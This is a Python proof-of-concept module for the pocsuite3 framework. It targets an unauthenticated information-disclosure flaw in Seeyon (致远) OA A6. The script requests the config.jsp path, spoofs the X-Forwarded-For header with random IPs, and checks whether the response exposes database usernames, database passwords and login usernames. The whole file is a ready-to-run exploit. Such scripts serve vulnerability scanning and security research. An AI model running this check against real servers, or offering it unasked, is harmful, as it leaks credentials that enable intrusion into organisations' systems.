#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-18'
    createDate = '2023-11-18'
    updateDate = '2023-11-18'
    references = []
    name = '致远OA_A6_config.jsp_敏感信息泄漏'
    appPowerLink = ''
    appName = '致远OA'
    appVersion = '致远OA A6'
    vulType = 'Information Disclosure'
    desc = """
    致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
    """
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'X-Forwarded-For': tools.get_random_ip()
        }
        res = requests.get(url=f"{self.url}/yyoa/ext/trafaxserver/SystemManage/config.jsp", headers=headers,
                           verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return "数据库用户名" in res.text and "数据库密码" in res.text and "登录用户名" in res.text and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    '[ Success ] 致远OA_A6_config.jsp_敏感信息泄漏 ': self.url,
                    '[ Payload ]': f"{self.url}/yyoa/ext/trafaxserver/SystemManage/config.jsp"
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
